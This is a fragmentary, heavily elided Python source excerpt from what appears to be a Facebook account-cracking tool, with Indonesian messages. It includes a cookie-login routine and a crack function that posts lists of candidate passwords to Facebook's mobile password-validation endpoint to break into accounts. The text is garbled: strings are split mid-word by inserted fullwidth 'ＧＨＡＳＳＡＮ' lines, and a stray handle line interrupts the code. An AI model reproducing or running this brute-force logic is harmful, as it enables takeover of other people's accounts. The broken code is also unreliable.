    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                ...
                print("[✘] Inv
ＧＨＡＳＳＡＮd cookie [NO]");time.sleep(2);self.login_cokie()
            ...
            if "me" in user:
                try:
                    ...
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan ber
ＧＨＡＳＳＡＮh akun");time.sleep(2);self.menu()
                    else:
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/v
ＧＨＡＳＳＡＮdate-password/?shbl=0',data=dataa,allow_redirects=False)
...
@SSWSG  -  @SSWSG					
					...
					try:ttl = re.findall('\<\/td\>\<td\ v
ＧＨＡＳＳＡＮgn\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
